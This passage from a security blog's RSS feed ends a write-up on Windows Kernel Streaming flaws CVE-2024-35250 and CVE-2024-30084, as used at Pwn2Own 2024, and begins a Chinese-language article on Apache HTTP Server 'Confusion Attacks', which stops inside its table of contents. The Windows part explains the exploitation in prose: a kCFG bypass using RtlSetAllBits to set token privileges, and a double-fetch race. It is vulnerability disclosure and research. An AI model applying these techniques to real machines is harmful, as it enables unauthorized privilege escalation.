&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;__int64&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__fastcall&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CKSThunkDevice&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;CheckIrpForStackAdjustmentNative&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__int64&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;_IRP&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;irp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__int64&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_OWORD&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Type3InputBuffer&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Set&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_OWORD&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;KSPROPSETID_DrmAudioStream&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;type3inputbuf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Id&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;type3inputbuf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Flags&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;   &lt;span class=&quot;c1&quot;&gt;//-----[5]   &lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;irp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;RequestorMode&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;//-------[6]&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;v14&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xC0000010&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;UserBuffer&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;irp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;UserBuffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;v14&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__int64&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;__fastcall&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_QWORD&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_QWORD&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__int64&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Type3InputBuffer&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x38&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))(&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;// call Type3InputBuffer+0x38&lt;/span&gt;
                &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;UserBuffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                &lt;span class=&quot;mi&quot;&gt;0LL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;v19&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;//------------[7]&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; 
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We can notice that if we give the property set as &lt;a href=&quot;https://learn.microsoft.com/mt-mt/windows-hardware/drivers/audio/kspropsetid-drmaudiostream&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KSPROPSETID_DrmAudioStream&lt;/code&gt;&lt;/a&gt;, there is additional processing at [5]. At [6], we can see that it first checks whether &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Irp-&amp;gt;RequestorMode&lt;/code&gt; is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KernelMode(0)&lt;/code&gt;. If it is called from user, it will directly return an error.&lt;/p&gt;

&lt;p&gt;It should be pretty obvious here that if we call IOCTL with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KSPROPERTY_TYPE_UNSERIALIZESET&lt;/code&gt; and specify the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KSPROPSETID_DrmAudioStream&lt;/code&gt; property, it will be &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KernelMode(0)&lt;/code&gt; here. Additionally, it will directly use the input provided by the user as a function call at [7]. Even the first parameter is controllable.&lt;/p&gt;

&lt;p&gt;After writing the PoC, we confirmed our results.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240823/25.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Some people might wonder, under what device or situation would have &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KSPROPSETID_DrmAudioStream&lt;/code&gt;? Actually, most audio devices will have it, primarily used for setting DRM-related content.&lt;/p&gt;

&lt;h3 id=&quot;exploitation&quot;&gt;Exploitation&lt;/h3&gt;
&lt;p&gt;Once arbitrary calls are achieved, accomplishing EoP is not too difficult. Although protections such as kCFG, kASLR, and SMEP will be encountered, the only protection that needs to be dealt with under Medium IL is kCFG.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;kCFG&lt;/strong&gt;&lt;/li&gt;
  &lt;li&gt;kASLR
    &lt;ul&gt;
      &lt;li&gt;NtQuerySystemInformation&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;SMEP
    &lt;ul&gt;
      &lt;li&gt;Reuse Kernel Code&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;…&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;bypass-kcfg&quot;&gt;Bypass kCFG&lt;/h4&gt;
&lt;p&gt;Our goal here is straightforward: to create an arbitrary write primitive from a legitimate function, which can then be used to achieve EoP through typical methods like &lt;a href=&quot;https://www.ired.team/miscellaneous-reversing-forensics/windows-kernel-internals/how-kernel-exploits-abuse-tokens-for-privilege-escalation#id-1.-replacing-tokens-for-privilege-escalation&quot;&gt;replacing the current process token with system token&lt;/a&gt; or &lt;a href=&quot;https://media.blackhat.com/bh-us-12/Briefings/Cerrudo/BH_US_12_Cerrudo_Windows_Kernal_Slides.pdf&quot;&gt;abusing the token privilege&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;It is intuitive to look directly for legitimate functions with names containing &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;set&lt;/code&gt;, as they are more likely to do arbitrary writing.  We directly take the export functions from &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ntoskrnl.exe&lt;/code&gt; to see if there are any good gadgets, as these functions are generally legitimate.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240823/26.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We quickly found &lt;a href=&quot;https://learn.microsoft.com/zh-tw/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlsetallbits&quot;&gt;RtlSetAllBits&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240823/27.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;It is a very useful gadget and a legitimate function in kCFG. Additionally, it only requires controlling the first parameter &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_RTL_BITMAP&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;_RTL_BITMAP&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;ULONG&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SizeOfBitMap&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;                                               
    &lt;span class=&quot;n&quot;&gt;ULONG&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;                                                   
&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt; 

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We can assign the buffer to any address and specify the size, allowing us to set up a range of bits entirely. At this point, we are almost done. As long as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Token-&amp;gt;Privilege&lt;/code&gt; is fully set up, we can use the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Abuse Privilege&lt;/code&gt; method to achieve EoP.&lt;/p&gt;

&lt;iframe width=&quot;560&quot; height=&quot;315&quot; src=&quot;https://www.youtube.com/embed/j1wzwXLxdVs?si=aKURBnYWXvbAaXin&quot; title=&quot;YouTube video player&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share&quot; referrerpolicy=&quot;strict-origin-when-cross-origin&quot; allowfullscreen=&quot;&quot;&gt;&lt;/iframe&gt;

&lt;p&gt;However, before the Pwn2Own event, we created a new Windows 11 23H2 VM on Hyper-V and ran the exploit. The result was a failure. It failed at the open device stage.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240823/28.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;After investigation, we discovered that Hyper-V does not have an audio device by default, causing the exploit to fail.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240823/29.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;In Hyper-V, only MSKSSRV is present by default. However, MSKSSRV does not have the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KSPROPSETID_DrmAudioStream&lt;/code&gt; property, which prevents us from successfully exploiting this EoP vulnerability. Therefore, we must find other ways to trigger it or discover new vulnerabilities. We decided to review the entire process again to see if there were any other exploitable vulnerabilities.&lt;/p&gt;

&lt;h3 id=&quot;cve-2024-30084&quot;&gt;CVE-2024-30084&lt;/h3&gt;
&lt;p&gt;After re-examining, it was found that &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IOCTL_KS_PROPERTY&lt;/code&gt; uses &lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/using-neither-buffered-nor-direct-i-o&quot;&gt;Neither I/O&lt;/a&gt; to transmit data, which means it uses the input buffer for data processing directly. Generally speaking, this method is not recommended as it often leads to &lt;strong&gt;double fetch&lt;/strong&gt; issues.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240823/30.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;From the above figure of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KspPropertyHandler&lt;/code&gt;, we can see that after the user calls IOCTL, the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Type3InputBuffer&lt;/code&gt; is directly copied into a newly allocated buffer, containing the &lt;a href=&quot;https://learn.microsoft.com/zh-tw/windows-hardware/drivers/stream/ksproperty-structure&quot;&gt;KSPROPERTY&lt;/a&gt; structure. This GUID in the structure is then used to check if the property set exists in the device. If it does, it will proceed to call &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;UnserializePropertySet&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Let’s take another look at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;UnserializePropertySet&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240823/31.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;It &lt;strong&gt;once again copies the user-provided data from &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Type3InputBuffer&lt;/code&gt;&lt;/strong&gt; as the input for the new IOCTL. Clearly, there exists a &lt;strong&gt;double fetch&lt;/strong&gt; vulnerability here, so we have modified the entire process, as shown in the following diagram.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240823/32.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;When we initially send &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IOCTL_KS_PROPERTY&lt;/code&gt;, we use the existing property  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KSPROPSETID_Service&lt;/code&gt; of MSKSSRV for subsequent operations. As shown in step 6 of the diagram, a copy of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KSPROPERTY&lt;/code&gt; is first made into the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SystemBuffer&lt;/code&gt;, and then this property is used to check whether it is in the support list of the KS object. Since MSKSSRV supports it, it will then call &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;UnserializePropertySet&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240823/33.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;After calling &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;UnserializePropertySet&lt;/code&gt;, due to the double fetch vulnerability, we can change &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KSPROPSETID_Service&lt;/code&gt; with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KSPROPSETID_DrmAudioStream&lt;/code&gt; between the check and use phases. Subsequently, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KSPROPSETID_DrmAudioStream&lt;/code&gt; will be used as the request to send IOCTL, thereby triggering the CVE-2024-35250 mentioned above logic flaw. This makes the vulnerability exploitable in any environment.&lt;/p&gt;

&lt;iframe width=&quot;560&quot; height=&quot;315&quot; src=&quot;https://www.youtube.com/embed/xNUj_XZ9LhQ?si=ONmvl9_8BV-z0idL&quot; title=&quot;YouTube video player&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share&quot; referrerpolicy=&quot;strict-origin-when-cross-origin&quot; allowfullscreen=&quot;&quot;&gt;&lt;/iframe&gt;

&lt;p&gt;Finally, we successfully compromised Microsoft Windows 11 during Pwn2Own Vancouver 2024.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240823/34.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;After the Pwn2Own event, our investigation revealed that this vulnerability has existed since Windows 7 for nearly 20 years. Moreover, it is highly reliable and has a 100% success rate in exploitation. We strongly recommend that everyone update to the latest version as soon as possible.&lt;/p&gt;

&lt;h2 id=&quot;to-be-continued&quot;&gt;To be continued&lt;/h2&gt;
&lt;p&gt;This article focuses on how we identified the vulnerabilities used in this year’s Pwn2Own and the attack surface analysis of Kernel Streaming. After discovering this vulnerability, we continued our research on this attack surface and found another exploitable vulnerability along with other interesting findings.&lt;/p&gt;

&lt;p&gt;Stay tuned for Part II, expected to be published in October of this year.&lt;/p&gt;

&lt;h2 id=&quot;reference&quot;&gt;Reference&lt;/h2&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://securityintelligence.com/x-force/critically-close-to-zero-day-exploiting-microsoft-kernel-streaming-service/&quot;&gt;Critically Close to Zero-Day: Exploiting Microsoft Kernel Streaming Service&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://conference.hitb.org/hitbsecconf2023hkt/materials/D2T1%20-%20Windows%20Kernel%20Security%20-%20A%20Deep%20Dive%20into%20Two%20Exploits%20Demonstrated%20at%20Pwn2Own%20-%20Thomas%20Imbert.pdf&quot;&gt;Windows Kernel Security - A Deep Dive into Two Exploits Demonstrated at Pwn2Own&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://big5-sec.github.io/posts/CVE-2023-29360-analysis/&quot;&gt;CVE-2023-29360 Analysis&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://securityintelligence.com/x-force/little-bug-that-could/&quot;&gt;Racing Round and Round: The Little Bug That Could&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://googleprojectzero.blogspot.com/2019/03/windows-kernel-logic-bug-class-access.html&quot;&gt;Windows Kernel Logic Bug Class: Access Mode Mismatch in IO Manager&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://googleprojectzero.blogspot.com/2021/01/hunting-for-bugs-in-windows-mini-filter.html&quot;&gt;Hunting for Bugs in Windows Mini-Filter Drivers&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://msrc.microsoft.com/blog/2019/03/local-privilege-escalation-via-the-windows-i-o-manager-a-variant-finding-collaboration/&quot;&gt;Local Privilege Escalation via the Windows I/O Manager: A Variant Finding &amp;amp; Collaboration&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</description>
                <link>https://devco.re/blog/2024/08/23/streaming-vulnerabilities-from-windows-kernel-proxying-to-kernel-part1-en/</link>
                <guid>https://devco.re/blog/2024/08/23/streaming-vulnerabilities-from-windows-kernel-proxying-to-kernel-part1-en</guid>
                <pubDate>Fri, 23 Aug 2024 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>Confusion Attacks: Exploiting Hidden Semantic Ambiguity in Apache HTTP Server!</title>
                <description>&lt;h6 id=&quot;orange-tsai-orange_8361--繁體中文版本--english-version&quot;&gt;Orange Tsai (&lt;a href=&quot;https://x.com/orange_8361&quot;&gt;@orange_8361&lt;/a&gt;)  |  &lt;a href=&quot;/blog/2024/08/09/confusion-attacks-exploiting-hidden-semantic-ambiguity-in-apache-http-server/&quot;&gt;繁體中文版本&lt;/a&gt;  |  &lt;a href=&quot;/blog/2024/08/09/confusion-attacks-exploiting-hidden-semantic-ambiguity-in-apache-http-server-en/&quot;&gt;English Version&lt;/a&gt;&lt;/h6&gt;

&lt;style&gt;
    .language-plaintext {
        background-color: #f9f2f4;
    }

    .highlight {
        border-left: 2px solid #44D62C !important;
    }
&lt;/style&gt;

&lt;p&gt;嗨，這是我今年發表在 &lt;a href=&quot;https://www.blackhat.com/us-24/briefings/schedule/index.html#confusion-attacks-exploiting-hidden-semantic-ambiguity-in-apache-http-server-pre-recorded-40227&quot;&gt;Black Hat USA 2024&lt;/a&gt; 上針對 Apache HTTP Server 的研究。 此外，這份研究也將在 &lt;a href=&quot;https://hitcon.org/2024/CMT/agenda/eff94e55-3f1d-4229-a65a-65ade9524421/&quot;&gt;HITCON&lt;/a&gt; 和 &lt;a href=&quot;https://orangecon.nl/&quot;&gt;OrangeCon&lt;/a&gt; 上發表，有興趣搶先了解可點此取得投影片：&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;a href=&quot;https://i.blackhat.com/BH-US-24/Presentations/US24-Orange-Confusion-Attacks-Exploiting-Hidden-Semantic-Thursday.pdf&quot;&gt;Confusion Attacks: Exploiting Hidden Semantic Ambiguity in Apache HTTP Server!&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;另外也謝謝來自 Akamai 的友善聯繫！ 此份研究發表後第一時間他們也發佈了緩解措施 (詳情可參考 &lt;a href=&quot;https://www.akamai.com/blog/security-research/2024-august-apache-waf-proactive-collaboration-orange-tsai-devcore&quot;&gt;Akamai 的部落格&lt;/a&gt;)。&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;tldr&quot;&gt;TL;DR&lt;/h2&gt;

&lt;p&gt;這篇文章探索了 Apache HTTP Server 中存在的架構問題，介紹了數個 Httpd 的架構債，&lt;strong&gt;包含 3 種不同的 Confusion Attacks、9 個新漏洞、20 種攻擊手法以及超過 30 種案例分析&lt;/strong&gt;。 包括但不限於：&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;怎麼使用一個 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;?&lt;/code&gt; 繞過 Httpd 內建的存取控制以及認證。&lt;/li&gt;
  &lt;li&gt;不安全的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RewriteRule&lt;/code&gt; 怎麼跳脫 Web Root 並存取整個檔案系統。&lt;/li&gt;
  &lt;li&gt;如何利用一段從 1996 遺留至今的程式碼把一個 XSS 轉化成 RCE。&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;大綱&quot;&gt;大綱&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;#在故事之前&quot;&gt;在故事之前&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#故事是如何開始的&quot;&gt;故事是如何開始的？&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#為什麼-apache-http-server-聞起來臭臭的&quot;&gt;為什麼 Apache HTTP Server 聞起來臭臭的？&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#關於這次的新攻擊面：-confusion-attacks&quot;&gt;關於這次的新攻擊面： Confusion Attacks&lt;/a&gt;
    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#-1-filename-confusion&quot;&gt;1. Filename Confusion&lt;/a&gt;
        &lt;ul&gt;
          &lt;li&gt;&lt;a href=&quot;#%ef%b8%8f-primitive-1-1-truncation&quot;&gt;Primitive 1-1. Truncation&lt;/a&gt;
            &lt;ul&gt;
              &lt;li&gt;&lt;a href=&quot;#%ef%b8%8f-1-1-1-path-truncation&quot;&gt;1-1-1. Path Truncation&lt;/a&gt;&lt;/li&gt;
              &lt;li&gt;&lt;a href=&quot;#%ef%b8%8f-1-1-2-mislead-rewriteflag-assignment&quot;&gt;1-1-2. Mislead RewriteFlag Assignment&lt;/a&gt;&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#%ef%b8%8f-primitive-1-2-acl-bypass&quot;&gt;Primitive 1-2. ACL Bypass&lt;/a&gt;&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#-2-documentroot-confusion&quot;&gt;2. DocumentRoot Confusion&lt;/a&gt;
        &lt;ul&gt;
          &lt;li&gt;&lt;a href=&quot;#%ef%b8%8f-primitive-2-1-server-side-source-code-disclosure&quot;&gt;Primitive 2-1. Server-Side Source Code Disclosure&lt;/a&gt;
            &lt;ul&gt;
              &lt;li&gt;&lt;a href=&quot;#%ef%b8%8f-2-1-1-disclose-cgi-source-code&quot;&gt;2-1-1. Disclose CGI Source Code&lt;/a&gt;&lt;/li&gt;
              &lt;li&gt;&lt;a href=&quot;#%ef%b8%8f-2-1-2-disclose-php-source-code&quot;&gt;2-1-2. Disclose PHP Source Code&lt;/a&gt;&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#%ef%b8%8f-primitive-2-2-local-gadgets-manipulation&quot;&gt;Primitive 2-2. Local Gadgets Manipulation!&lt;/a&gt;
            &lt;ul&gt;
              &lt;li&gt;&lt;a href=&quot;#%ef%b8%8f-2-2-1-local-gadget-to-information-disclosure&quot;&gt;2-2-1. Local Gadget to Information Disclosure&lt;/a&gt;&lt;/li&gt;
              &lt;li&gt;&lt;a href=&quot;#%ef%b8%8f-2-2-2-local-gadget-to-xss&quot;&gt;2-2-2. Local Gadget to XSS&lt;/a&gt;&lt;/li&gt;
              &lt;li&gt;&lt;a href=&quot;#%ef%b8%8f-2-2-3-local-gadget-to-lfi&quot;&gt;2-2-3. Local Gadget to LFI&lt;/a&gt;&lt;/li&gt;
              &lt;li&gt;&lt;a href=&quot;#%ef%b8%8f-2-2-4-local-gadget-to-ssrf&quot;&gt;2-2-4. Local Gadget to SSRF&lt;/a&gt;&lt;/li&gt;
              &lt;li&gt;&lt;a href=&quot;#%ef%b8%8f-2-2-5-local-gadget-to-rce&quot;&gt;2-2-5. Local Gadget to RCE&lt;/a&gt;&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#%ef%b8%8f-primitive-2-3-jailbreak-from-local-gadgets&quot;&gt;Primitive 2-3. Jailbreak from Local Gadgets&lt;/a&gt;
            &lt;ul&gt;
